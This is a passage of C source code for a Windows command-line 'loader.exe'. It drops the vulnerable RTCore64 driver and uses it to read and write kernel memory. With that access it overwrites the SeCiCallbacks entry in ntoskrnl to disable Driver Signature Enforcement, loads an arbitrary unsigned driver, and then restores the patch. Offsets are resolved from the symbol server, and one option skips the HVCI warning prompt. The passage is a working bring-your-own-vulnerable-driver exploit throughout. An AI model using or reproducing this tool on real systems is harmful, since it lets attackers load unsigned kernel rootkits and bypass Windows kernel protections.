        wprintf(L"[+] driver unloaded via ntunloaddriver\n");
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return 0;
}

static int CmdLoad(const WCHAR* driverPath, ULONGLONG seciRva, ULONGLONG safeRva, BOOL seciSet, BOOL safeSet,
    BOOL assumeYes) {
    if (!HvciGuard(assumeYes))
        return 1;
    if (!seciSet && !safeSet) {
        wprintf(L"[*] resolving kernel offsets from microsoft symbol server\n");
        if (!EnsurePdbDownloaded()) {
            wprintf(L"[-] cannot obtain pdb symbols\n");
            return 1;
        }
        if (!ResolveOffsets(&seciRva, &safeRva)) {
            wprintf(L"[-] symbol resolution failed\n");
            return 1;
        }
    }
    wprintf(L"[+] secicallbacks rva 0x%llX\n", seciRva);
    wprintf(L"[+] zwflushinstructioncache rva 0x%llX\n", safeRva);
    wprintf(L"[*] extracting vulnerable driver\n");
    if (!InstallVulnerableDriver())
        return 1;
    HANDLE hDev = INVALID_HANDLE_VALUE;
    if (!OpenRtcDevice(&hDev)) {
        wprintf(L"[-] cannot open rtcore64 device (error %lu)\n", GetLastError());
        RemoveVulnerableDriver();
        return 1;
    }
    ULONGLONG ntBase = 0;
    ULONG ntSize = 0;
    if (!GetNtoskrnlBase(&ntBase, &ntSize)) {
        wprintf(L"[-] cannot locate ntoskrnl.exe (kernel reported no valid base)\n");
        KERNEL_MODULE dbg[8];
        ULONG dbgCount = 0;
        if (EnumKernelModules(dbg, 8, &dbgCount)) {
            for (ULONG i = 0; i < dbgCount; i++)
                wprintf(
                    L"    module %u: base 0x%llX size 0x%lX %ls\n", i, dbg[i].Base, dbg[i].Size, dbg[i].Name);
        }
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    wprintf(L"[+] ntoskrnl.exe base 0x%llX size 0x%lX\n", ntBase, ntSize);
    ULONG dosMagic = 0;
    if (!ReadMem32(hDev, ntBase, &dosMagic)) {
        wprintf(L"[-] rtcore64 read failed at ntoskrnl base 0x%llX\n", ntBase);
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    if ((dosMagic & 0xFFFF) != 0x5A4D) {
        wprintf(L"[-] no mz header at 0x%llX (got 0x%08lX) - base does not point at the kernel image\n",
            ntBase, dosMagic);
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    wprintf(L"[+] rtcore64 read primitive verified\n");
    if (!SafeRvaInText(safeRva)) {
        wprintf(L"[-] safe function rva 0x%llX is not inside .text of ntoskrnl.exe\n", safeRva);
        wprintf(L"[-] offsets are wrong for this windows build\n");
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    wprintf(L"[+] safe function rva validated in .text\n");
    ULONGLONG targetAddr = ntBase + seciRva + SECI_CALLBACK_OFFSET;
    ULONGLONG safeFn = ntBase + safeRva;
    ULONGLONG current = 0;
    if (!ReadMem64(hDev, targetAddr, &current)) {
        wprintf(L"[-] cannot read callback at 0x%llX\n", targetAddr);
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    wprintf(L"[+] current callback 0x%llX\n", current);
    BOOL needPatch = TRUE;
    if (current == safeFn) {
        wprintf(L"[+] dse already patched\n");
        needPatch = FALSE;
    } else {
        KERNEL_MODULE modules[512];
        ULONG moduleCount = 0;
        const WCHAR* host = NULL;
        if (EnumKernelModules(modules, 512, &moduleCount))
            host = FindModuleForAddress(modules, moduleCount, current);
        if (!host) {
            wprintf(L"[-] callback is not inside any loaded kernel module\n");
            wprintf(L"[-] secicallbacks rva 0x%llX is wrong for this windows build\n", seciRva);
            ULONGLONG slot = 0;
            for (ULONG off = 0; off <= 0x40; off += 8) {
                if (ReadMem64(hDev, ntBase + seciRva + off, &slot))
                    wprintf(L"    table+0x%02lX: 0x%llX\n", off, slot);
            }
            CloseHandle(hDev);
            RemoveVulnerableDriver();
            return 1;
        }
        wprintf(L"[+] callback hosted by %s\n", host);
    }
    if (needPatch) {
        if (!SaveState(current))
            wprintf(L"[!] warning: cannot save original callback to registry\n");
        wprintf(L"[*] patching callback 0x%llX -> 0x%llX\n", current, safeFn);
        if (!WriteMem64(hDev, targetAddr, safeFn)) {
            wprintf(L"[-] dse patch write failed\n");
            CloseHandle(hDev);
            RemoveVulnerableDriver();
            return 1;
        }
        ULONGLONG verify = 0;
        if (ReadMem64(hDev, targetAddr, &verify) && verify == safeFn) {
            wprintf(L"[+] dse patched and verified\n");
        } else {
            wprintf(L"[!] patch verification failed\n");
        }
    }
    WCHAR normPath[MAX_PATH];
    if (!NormalizeDriverPath(driverPath, normPath, MAX_PATH)) {
        wprintf(L"[-] invalid driver path: %ls\n", driverPath);
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    wprintf(L"[*] loading target driver %s\n", normPath);
    DWORD loadErr = 0;
    BOOL loaded = StartTargetService(normPath, &loadErr);
    if (loaded) {
        wprintf(L"[+] target driver loaded successfully\n");
    } else {
        wprintf(L"[-] target driver failed to start (error %lu)\n", loadErr);
    }
    wprintf(L"[*] restoring dse\n");
    if (needPatch) {
        if (WriteMem64(hDev, targetAddr, current)) {
            ULONGLONG verify = 0;
            if (ReadMem64(hDev, targetAddr, &verify) && verify == current) {
                wprintf(L"[+] dse restored\n");
                ClearState();
            } else {
                wprintf(L"[!] dse restore verification failed, state kept in registry\n");
            }
        } else {
            wprintf(L"[!] dse restore failed, state kept in registry\n");
        }
    }
    CloseHandle(hDev);
    RemoveVulnerableDriver();
    wprintf(L"[+] cleanup complete\n");
    return loaded ? 0 : 1;
}

static int CmdRestore(ULONGLONG seciRva, BOOL seciSet, BOOL assumeYes) {
    ULONGLONG original = 0;
    if (!LoadState(&original)) {
        wprintf(L"[-] no saved dse state found\n");
        return 1;
    }
    wprintf(L"[+] saved original callback 0x%llX\n", original);
    if (!HvciGuard(assumeYes))
        return 1;
    if (!seciSet) {
        ULONGLONG dummySafe = 0;
        if (!EnsurePdbDownloaded() || !ResolveOffsets(&seciRva, &dummySafe))
            seciRva = DEFAULT_SECI_RVA;
    }
    if (!InstallVulnerableDriver())
        return 1;
    HANDLE hDev = INVALID_HANDLE_VALUE;
    if (!OpenRtcDevice(&hDev)) {
        wprintf(L"[-] cannot open rtcore64 device (error %lu)\n", GetLastError());
        RemoveVulnerableDriver();
        return 1;
    }
    ULONGLONG ntBase = 0;
    ULONG ntSize = 0;
    if (!GetNtoskrnlBase(&ntBase, &ntSize)) {
        wprintf(L"[-] cannot locate ntoskrnl.exe\n");
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    ULONGLONG targetAddr = ntBase + seciRva + SECI_CALLBACK_OFFSET;
    ULONGLONG current = 0;
    if (!ReadMem64(hDev, targetAddr, &current)) {
        wprintf(L"[-] cannot read callback at 0x%llX\n", targetAddr);
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 1;
    }
    wprintf(L"[+] current callback 0x%llX\n", current);
    BOOL ok = TRUE;
    if (current == original) {
        wprintf(L"[+] dse already restored\n");
        ClearState();
    } else {
        wprintf(L"[*] restoring callback 0x%llX -> 0x%llX\n", current, original);
        if (WriteMem64(hDev, targetAddr, original)) {
            ULONGLONG verify = 0;
            if (ReadMem64(hDev, targetAddr, &verify) && verify == original) {
                wprintf(L"[+] dse restored and verified\n");
                ClearState();
            } else {
                wprintf(L"[-] restore verification failed\n");
                ok = FALSE;
            }
        } else {
            wprintf(L"[-] restore write failed\n");
            ok = FALSE;
        }
    }
    CloseHandle(hDev);
    RemoveVulnerableDriver();
    return ok ? 0 : 1;
}

static void PrintHelp(void) {
    wprintf(L"usage:\n");
    wprintf(L"  loader.exe load <driver.sys> [-sec <rva>] [-safe <rva>] [-y]\n");
    wprintf(L"  loader.exe restore [-sec <rva>] [-y]\n");
    wprintf(L"  loader.exe unload <service>\n");
    wprintf(L"\n");
    wprintf(L"  load     bypass dse and start the target driver\n");
    wprintf(L"  restore  restore dse from saved state\n");
    wprintf(L"  unload   unload a running kernel driver via ntunloaddriver\n");
    wprintf(L"  -sec     secicallbacks rva (default: resolved from pdb)\n");
    wprintf(L"  -safe    zwflushinstructioncache rva (default: resolved from pdb)\n");
    wprintf(L"  -y       skip hvci prompt\n");
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        PrintHelp();
        return 1;
    }
    ULONGLONG seciRva = DEFAULT_SECI_RVA;
    ULONGLONG safeRva = DEFAULT_SAFE_RVA;
    BOOL seciSet = FALSE;
    BOOL safeSet = FALSE;
    BOOL assumeYes = FALSE;
    const WCHAR* driverPath = NULL;
    for (int i = 2; i < argc; i++) {
        if (_wcsicmp(argv[i], L"-sec") == 0 && i + 1 < argc) {
            seciRva = wcstoull(argv[++i], NULL, 0);
            seciSet = TRUE;
        } else if (_wcsicmp(argv[i], L"-safe") == 0 && i + 1 < argc) {
            safeRva = wcstoull(argv[++i], NULL, 0);
            safeSet = TRUE;
        } else if (_wcsicmp(argv[i], L"-y") == 0) {
            assumeYes = TRUE;
        } else if (!driverPath) {
            driverPath = argv[i];
        }
    }
    if (_wcsicmp(argv[1], L"load") == 0) {
        if (!driverPath) {
            PrintHelp();
            return 1;
        }
        return CmdLoad(driverPath, seciRva, safeRva, seciSet, safeSet, assumeYes);
    }
    if (_wcsicmp(argv[1], L"unload") == 0) {
        if (!driverPath) {
            PrintHelp();
            return 1;
        }
        return CmdUnload(driverPath);
    }
    if (_wcsicmp(argv[1], L"restore") == 0)
        return CmdRestore(seciRva, seciSet, assumeYes);
    if (_wcsicmp(argv[1], L"help") == 0 || _wcsicmp(argv[1], L"/?") == 0) {
        PrintHelp();
        return 0;
    }
    wprintf(L"[-] unknown command: %s\n", argv[1]);
    PrintHelp();
    return 1;
}
